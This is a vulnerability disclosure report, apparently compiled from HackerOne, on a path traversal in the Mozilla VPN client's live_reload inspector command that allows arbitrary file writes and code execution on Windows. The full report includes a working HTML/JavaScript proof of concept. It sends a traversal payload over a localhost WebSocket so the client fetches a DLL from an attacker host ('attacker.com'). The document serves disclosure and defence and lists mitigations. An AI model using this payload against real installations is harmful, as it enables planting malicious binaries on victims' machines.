# Mozilla VPN Clients: RCE via file write and path traversal

## Metadata
- **Source:** HackerOne
- **Report:** 2995025 | https://hackerone.com/reports/2995025
- **Submitted:** 2025-02-15
- **Reporter:** trein
- **Program:** Mozilla VPN
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Path Traversal, Arbitrary File Write, Remote Code Execution, Insecure File Operations
- **CVEs:** None
- **Category:** memory-binary

## Summary
The Mozilla VPN Client's live_reload inspector command is vulnerable to path traversal when downloading remote files. An attacker can craft a malicious filename containing directory traversal sequences (..\) to write arbitrary files to any location on the filesystem, achieving remote code execution by overwriting executable files or DLLs.

## Attack scenario
1. Attacker enables developer mode on victim's Mozilla VPN by opening help menu and clicking title 6 times
2. Attacker enables staging servers in developer options to make client accept WebSocket connections
3. Attacker hosts malicious DLL on HTTP server and crafts WebSocket message with live_reload command containing path traversal payload (e.g., live_reload http://attacker.com/..\..\traversal_poc.dll)
4. Attacker tricks victim into opening malicious HTML page that establishes WebSocket connection to localhost:8765 and sends crafted payload
5. Mozilla VPN Client receives live_reload command and downloads remote file, but fails to sanitize path
6. File is written to attacker-controlled location outside intended directory (e.g., C:\Users\user\AppData\Local\Mozilla instead of Mozilla VPN subfolder), overwriting legitimate binaries and achieving RCE

## Root cause
The inspectorhotreloader.cpp code concatenates user-controlled filename directly with base directory without sanitizing path traversal sequences. The vulnerable line `QString("%1/%2").arg(m_qml_folder, path.fileName())` uses path.fileName() which can contain backslash characters and directory traversal sequences that bypass the intended directory boundary.

## Attacker mindset
An opportunistic attacker targeting Mozilla VPN users with developer mode enabled. The attack requires minimal user interaction (visiting a website) and exploits a command designed for legitimate development purposes. The attacker leverages the WebSocket inspector interface to bypass normal security controls and weaponizes file write functionality for code execution.

## Defensive takeaways
- Implement strict path canonicalization and validation before any file operations; resolve all path components and verify the final path is within the intended directory
- Use allowlisting for filenames rather than relying on sanitization; only permit alphanumeric characters and safe extensions
- Separate filename from directory path completely; never concatenate user input directly with filesystem operations
- Disable inspector/developer features in production builds or require explicit authentication and authorization checks
- Sanitize WebSocket input with same rigor as network input; inspector commands should not bypass standard security validations
- Implement filesystem write protections using OS-level access controls for application directories
- Consider using secure APIs like QDir::filePath() with validation rather than string concatenation
- Add runtime integrity checks for critical binaries before execution

## Variant hunting
Check for similar path traversal in other file download/write operations across the codebase
Review all inspector commands that accept file paths or filenames for similar concatenation patterns
Audit WebSocket handlers for input validation gaps compared to HTTPS API endpoints
Search for other uses of path.fileName() without validation in file operations
Test other developer mode features for directory traversal vulnerabilities
Check if path traversal works on macOS despite reported limitation (possibly different path separator handling)
Investigate if symlink following could compound the vulnerability for privilege escalation
Review if temporary file cleanup is properly implemented to prevent exploitation window

## MITRE ATT&CK
- T1190
- T1218
- T1566
- T1104
- T1070

## Notes
The vulnerability requires developer mode to be explicitly enabled, which is a security boundary that should have prevented access. However, the report demonstrates this is achievable with minimal user interaction (6 clicks). The attacker indicates this does not work on macOS, likely due to different path handling (forward vs backward slashes). Related to previous report #2920675 with similar impact. The WebSocket interface on localhost:8765 becomes an attack surface when combined with CSRF-like techniques to trigger commands from arbitrary websites.

## Full report
<details><summary>Expand</summary>

## Summary:
Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all commands in the inspector, I noticed the "live_reload" command can be used with remote files. When using this command, the remote file is downloaded to a tmp folder. The problem is that there is a path traversal here, meaning we can override any file on the filesystem (tested on Windows).

Vulnerable code (InspectorHotreloader::fetchAndAnnounce() https://github.com/mozilla-mobile/mozilla-vpn-client/blob/main/src/inspector/inspectorhotreloader.cpp):
```
QObject::connect(
      request, &NetworkRequest::requestCompleted,
      [this, path, dummy_task](const QByteArray& data) {
        dummy_task->deleteLater();
        auto temp_path = QString("%1/%2").arg(m_qml_folder, path.fileName());
        auto temp_file = new QFile(temp_path);
        temp_file->open(QIODevice::WriteOnly);
        if (!temp_file->write(data)) {
          logger.warning() << "Unable to write to file:"
                           << temp_file->fileName();
          return;
        }
        if (!temp_file->flush()) {
          logger.warning() << "Unable to flush to file:"
                           << temp_file->fileName();
          return;
        }
        temp_file->close();
        QFileInfo info(temp_path);
        annonceReplacedFile(QUrl::fromLocalFile(info.absoluteFilePath()));
      });
```
You can see in the above snippet, that the temp_path  is simply a concatenation of a set directory and our filename.

## Steps To Reproduce:
  
1. Download Mozilla VPN here: https://www.mozilla.org/en-US/products/vpn/download/
  1. Turn on developer mode (see video PoC below):
      1. Open the help menu
      1. Click  the "Help" title 6 times rapidly
      1. In the developer options, check "Use Staging Servers"
      1. Fully close and reopen
  1. Save the following HTML and open it (change to your attacker_server)
``` html
<script>
    var ws = new WebSocket('ws://localhost:8765/');
    var attacker_server = "███████" // needs to be HTTP, no HTTPS
    
    payload = `live_reload ${attacker_server}/..\\..\\traversal_poc.dll`

    ws.onopen = function() {
        ws.send(payload); 
    };
    ws.onmessage = function(event) {
        document.getElementById("data").innerText += event.data + "\n";
    };
 </script>
 <h1>Data retrieved:</h1>
 <div id="data"></div>
```
1. Notice the file was written to C:\Users\user\AppData\Local\Mozilla instead of C:\Users\user\AppData\Local\Mozilla\Mozilla VPN\hot_reload.

## Supporting Material/References:
█████

Happy to help if anything is unclear!

## Impact

Any file can be overridden leading to RCE. This is exploitable via limited user interaction (simply opening the attacker site) when the staging servers are being used. ==Note that this does not work on macOS.== The impact is the same as in #2920675.

</details>

---
*Analysed by Claude on 2026-05-11*
